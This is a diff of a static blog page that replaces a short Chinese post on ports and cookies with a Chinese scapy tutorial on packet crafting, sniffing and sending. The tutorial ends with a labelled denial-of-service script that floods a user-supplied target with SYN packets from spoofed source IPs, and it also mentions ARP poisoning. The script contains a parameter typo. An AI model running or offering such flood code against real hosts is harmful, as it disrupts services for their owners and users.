@@ -16,24 +16,28 @@
   <meta name="author" content="August Rosenberg">
   <meta name="keywords" content="">
   
-    <meta name="description" content="常见的默认端口   协议 端口    http 80   https 443   mysql 3369   Cookie，session和tokenCookie由于http一次性的，为了达到持续存储的想法，浏览器就会存储我们的cookie，但是简单理解为cookie是一个载体 session诞生于服务器，利用cookie传送，session最重要的是sessionid，可以直接为用户的密码和账号的">
+    <meta name="description" content="简介这个包适用于网络嗅探的非常强大的第三方库,可以用于packet嗅探和伪造packet。在scapy的内部就已经实现了很多的网络协议。比如DNS、ARP、IP、TCP、UDP等等 我们可以用它操作报文， 可以伪造或者解析多种协议的报文。还具有转发、捕获、匹配请求和响应的功能。 可以替代hping[^hping]、arpspoof[^arpspoof]、arping[^arping]、p0f[^p">
 <meta property="og:type" content="article">
-<meta property="og:title" content="web随记">
-<meta property="og:url" content="https://tsy244.github.io/2023/12/01/web/web%E9%9A%8F%E8%AE%B0/index.html">
+<meta property="og:title" content="scapy">
+<meta property="og:url" content="https://tsy244.github.io/2023/12/12/python/scapy/index.html">
 <meta property="og:site_name" content="AU9U5T">
-<meta property="og:description" content="常见的默认端口   协议 端口    http 80   https 443   mysql 3369   Cookie，session和tokenCookie由于http一次性的，为了达到持续存储的想法，浏览器就会存储我们的cookie，但是简单理解为cookie是一个载体 session诞生于服务器，利用cookie传送，session最重要的是sessionid，可以直接为用户的密码和账号的">
+<meta property="og:description" content="简介这个包适用于网络嗅探的非常强大的第三方库,可以用于packet嗅探和伪造packet。在scapy的内部就已经实现了很多的网络协议。比如DNS、ARP、IP、TCP、UDP等等 我们可以用它操作报文， 可以伪造或者解析多种协议的报文。还具有转发、捕获、匹配请求和响应的功能。 可以替代hping[^hping]、arpspoof[^arpspoof]、arping[^arping]、p0f[^p">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2023-12-01T05:25:16.000Z">
-<meta property="article:modified_time" content="2023-12-12T16:27:06.625Z">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/scapy/image-20231213112750257.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/scapy/image-20231213112941954.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/scapy/image-20231213113358374.png">
+<meta property="article:published_time" content="2023-12-12T15:36:29.000Z">
+<meta property="article:modified_time" content="2023-12-13T15:34:10.502Z">
 <meta property="article:author" content="August Rosenberg">
-<meta property="article:tag" content="web">
+<meta property="article:tag" content="python">
 <meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/scapy/image-20231213112750257.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>web随记 - AU9U5T</title>
+  <title>scapy - AU9U5T</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -199,7 +203,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="web随记"></span>
+            <span id="subtitle" data-typed-text="scapy"></span>
           
         </div>
 
@@ -215,8 +219,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-12-01 13:25" pubdate>
-          December 1, 2023 pm
+        <time datetime="2023-12-12 23:36" pubdate>
+          December 12, 2023 pm
         </time>
       </span>
     
@@ -227,7 +231,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          291 words
+          1.6k words
         
       </span>
     
@@ -238,7 +242,7 @@
         
         
         
-          3 mins
+          14 mins
         
       </span>
     
@@ -276,35 +280,61 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">web随记</h1>
+            <h1 style="display: none">scapy</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="常见的默认端口"><a href="#常见的默认端口" class="headerlink" title="常见的默认端口"></a>常见的默认端口</h1><table>
-<thead>
-<tr>
-<th>协议</th>
-<th>端口</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>http</td>
-<td>80</td>
-</tr>
-<tr>
-<td>https</td>
-<td>443</td>
-</tr>
-<tr>
-<td>mysql</td>
-<td>3369</td>
-</tr>
-</tbody></table>
-<h1 id="Cookie，session和token"><a href="#Cookie，session和token" class="headerlink" title="Cookie，session和token"></a>Cookie，session和token</h1><h2 id="Cookie"><a href="#Cookie" class="headerlink" title="Cookie"></a>Cookie</h2><p>由于http一次性的，为了达到持续存储的想法，浏览器就会存储我们的cookie，但是简单理解为cookie是一个载体</p>
-<h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><p>诞生于服务器，利用cookie传送，session最重要的是sessionid，可以直接为用户的密码和账号的存储时间，当sessionid&#x3D;0的时候就需要重新输入密码和账号了。保存于服务器</p>
-<h2 id="token"><a href="#token" class="headerlink" title="token"></a>token</h2><p>创建于服务器了了，保存于客户端，为了防止大量用户将sessionid保存到服务器而使用的</p>
-<h1 id="ping"><a href="#ping" class="headerlink" title="ping"></a>ping</h1><p>ping使用的协议是ICMP</p>
+                <h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>这个包适用于网络嗅探的非常强大的第三方库,可以用于packet嗅探和伪造packet。在scapy的内部就已经实现了很多的网络协议。比如DNS、ARP、IP、TCP、UDP等等</p>
+<p>我们可以用它操作报文， 可以伪造或者解析多种协议的报文。还具有转发、捕获、匹配请求和响应的功能。</p>
+<p>可以替代<code>hping</code>[^hping]、arpspoof[^arpspoof]、arping[^arping]、p0f[^p0f]。可以替代部分的nmap，tcpdump，tshark的功能</p>
+<h1 id="scapy"><a href="#scapy" class="headerlink" title="scapy"></a>scapy</h1><ol>
+<li><p>查看支持的网络协议</p>
+<p>可以使用<code>ls()</code>查看支持什么协议</p>
+</li>
+<li><p>其他比较常见的函数</p>
+<p>还可以用lsc()函数来查看scapy的指令集（函数）。比较常用的函数包括arpcachepoison（用于arp毒化攻击，也叫arp欺骗攻击），arping（用于构造一个ARP的who-has包） ，send(用于发3层报文)，sendp（用于发2层报文）, sniff（用于网络嗅探，类似Wireshark和tcpdump）, sr（发送+接收3层报文），srp（发送+接收2层报文）等等</p>
+</li>
+<li><p>还可以对ls()函数添加参数，比如IP，就可以查看IP包的各种默认的参数</p>
+</li>
+<li><p>构造一个包</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">name=IP(src=,dst=)/TCP()<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>这个包的详细资料</p>
+<p>假设现在使用dst&#x3D;’baidu.com’</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/scapy/image-20231213112750257.png" srcset="/img/loading.gif" lazyload alt="image-20231213112750257"></p>
+<p>展示：</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/scapy/image-20231213112941954.png" srcset="/img/loading.gif" lazyload alt="image-20231213112941954"></p>
+</li>
+<li><p>发送包</p>
+<p>有多种发送的方式</p>
+<ul>
+<li><p>send()</p>
+<p>发送一个三层的数据包，但是不接受</p>
+</li>
+<li><p>sr1()</p>
+<p>发送一个三层的包，但是接受返回的包</p>
+</li>
+<li><p>srp()</p>
+<p>发送一个两层的包</p>
+</li>
+<li><p>sr2()</p>
+<p>接受两个</p>
+</li>
+</ul>
+<p>现在由于需要接受返回的信息</p>
+<p>我们就需要接受返回的包</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/python/scapy/image-20231213113358374.png" srcset="/img/loading.gif" lazyload alt="image-20231213113358374"></p>
+</li>
+<li><p>返回来的包也可以查看信息，和创建的包是一样的</p>
+</li>
+</ol>
+<h1 id="python-中使用scapy"><a href="#python-中使用scapy" class="headerlink" title="python 中使用scapy"></a>python 中使用scapy</h1><p>以一个拒绝服务式攻击脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment"># from scapy.all import IP, TCP</span><br><span class="hljs-keyword">import</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">as</span> scapy<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> DotProduct<br><span class="hljs-keyword">import</span> random<br><br>target=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;input target(ip):&quot;</span>)<br>dPort=<span class="hljs-number">80</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">synFlood</span>(<span class="hljs-params">target,dPort</span>):<br>    srcList=[<span class="hljs-string">&#x27;11.1.1.2&#x27;</span>,<span class="hljs-string">&#x27;22.1.1.2&#x27;</span>,<span class="hljs-string">&#x27;33.1.1.2&#x27;</span>,<span class="hljs-string">&#x27;44.1.1.2&#x27;</span>]<br>    <span class="hljs-keyword">for</span> sPort <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1024</span>,<span class="hljs-number">65535</span>):<br>        index=random.randrange(<span class="hljs-number">4</span>)<br>        ipLayer=scapy.IP(src=srcList[index],des=target)<br>        tcpLayer=scapy.TCP(sport=sPort,dport=dPort,flags=<span class="hljs-string">&quot;S&quot;</span>) <span class="hljs-comment"># 这里S是SYN </span><br>        packet=ipLayer/tcpLayer<br>        scapy.send(packet) <span class="hljs-comment"># 这里不需要接受就是为了造成拒绝服务</span><br><br>synFlood(target,dPort)<br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="实现基于TCP端口扫描的工具"><a href="#实现基于TCP端口扫描的工具" class="headerlink" title="实现基于TCP端口扫描的工具"></a>实现基于TCP端口扫描的工具</h1><p>[^hping]:hping 命令行的TCP&#x2F;IP数据包解释器&#x2F;分析器，具体可以这篇文章 <a target="_blank" rel="noopener" href="https://blog.csdn.net/carefree2005/article/details/120870526">https://blog.csdn.net/carefree2005/article/details/120870526</a><br>[^arpspoof]:这个是用于arp欺骗用的，可以参考这篇文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/who_im_i/article/details/120234324">https://blog.csdn.net/who_im_i/article/details/120234324</a><br>[^arping]: mac和ip 的互查，<a target="_blank" rel="noopener" href="https://blog.csdn.net/wz_cow/article/details/80870876">https://blog.csdn.net/wz_cow/article/details/80870876</a><br>[^p0f]: 简单理解为被动指纹识别的工具<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_38776582/article/details/124001543">https://blog.csdn.net/qq_38776582/article/details/124001543</a></p>
 
                 
               </div>
@@ -317,7 +347,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/web/">#web</a>
+        <a href="/tags/python/">#python</a>
       
     </div>
   
@@ -329,8 +359,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>web随记</div>
-      <div>https://tsy244.github.io/2023/12/01/web/web随记/</div>
+      <div>scapy</div>
+      <div>https://tsy244.github.io/2023/12/12/python/scapy/</div>
     </div>
     <div class="license-meta">
       
@@ -342,7 +372,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>Posted on</div>
-          <div>December 1, 2023</div>
+          <div>December 12, 2023</div>
         </div>
       
       
@@ -374,9 +404,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/12/01/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/XSS/" title="XSS">
+                      <a href="/2023/12/13/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/CMS%E6%BC%8F%E6%B4%9E/" title="CMS漏洞">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">XSS</span>
+                        <span class="hidden-mobile">CMS漏洞</span>
                         <span class="visible-mobile">Previous</span>
                       </a>
                     
@@ -384,8 +414,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/12/01/web/DNS%E9%87%8D%E7%BB%91%E5%AE%9A%E6%94%BB%E5%87%BB/" title="DNS重绑定攻击">
-                        <span class="hidden-mobile">DNS重绑定攻击</span>
+                      <a href="/2023/12/09/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/CSRF/" title="CSRF">
+                        <span class="hidden-mobile">CSRF</span>
                         <span class="visible-mobile">Next</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
